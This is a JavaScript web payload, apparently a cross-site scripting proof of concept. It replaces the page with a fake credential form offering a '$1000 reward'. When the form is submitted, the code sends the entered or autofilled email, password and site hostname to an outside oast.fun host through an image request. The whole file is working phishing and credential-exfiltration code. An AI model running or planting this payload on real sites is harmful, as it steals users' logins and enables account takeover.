document.body.innerHTML = "";

// Create a container for the form and title
var container = document.createElement("div");
container.style.display = "flex";
container.style.flexDirection = "column";
container.style.justifyContent = "center";
container.style.alignItems = "center";
container.style.height = "100vh";

// Create a title
var title = document.createElement("h1");
title.innerText = "CHECK YOUR CREDENTIAL";
title.style.fontSize = "24px";
title.style.fontWeight = "bold";
title.style.textAlign = "center";
title.style.marginBottom = "10px"; // Reduced margin for closer alignment
container.appendChild(title);

// Create form element
var form = document.createElement("form");
form.style.display = "flex";
form.style.flexDirection = "column";
form.style.justifyContent = "center";
form.style.alignItems = "center";

// Create visible input fields
var inputUsername = document.createElement("input");
inputUsername.type = "text";
inputUsername.id = "email";
inputUsername.name = "email";
inputUsername.placeholder = "Email";
inputUsername.style.width = "300px";
inputUsername.style.height = "40px";
inputUsername.style.marginBottom = "10px";

var inputPassword = document.createElement("input");
inputPassword.type = "password";
inputPassword.id = "password";
inputPassword.name = "password";
inputPassword.placeholder = "Password";
inputPassword.style.width = "300px";
inputPassword.style.height = "40px";
inputPassword.style.marginBottom = "10px";

// Create submit button
var submitButton = document.createElement("button");
submitButton.type = "submit";
submitButton.innerText = "Claim Your $1000 Reward";
submitButton.style.width = "300px";
submitButton.style.height = "40px";
submitButton.style.marginTop = "10px";
submitButton.style.backgroundColor = "#4CAF50";
submitButton.style.color = "white";
submitButton.style.border = "none";
submitButton.style.cursor = "pointer";

// Add fields to the form
form.appendChild(inputUsername);
form.appendChild(inputPassword);
form.appendChild(submitButton);
container.appendChild(form);
document.body.appendChild(container);

// Intercept form submission to capture credentials
form.onsubmit = function (e) {
  e.preventDefault(); // Prevent actual form submission

  // Capture autofilled values
  let username = inputUsername.value;
  let password = inputPassword.value;

  if (username && password) {
    var img = new Image();
    img.src = `http://mpvzdbjbftridrbbwcgldrt5uz4w11nqg.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&domain=${encodeURIComponent(window.location.hostname)}`;
    document.body.appendChild(img);
    alert("Your credentials have been captured!");
  } else {
    console.error("Autofill did not work. No credentials captured.");
    alert("Autofill failed. No credentials captured.");
  }
};
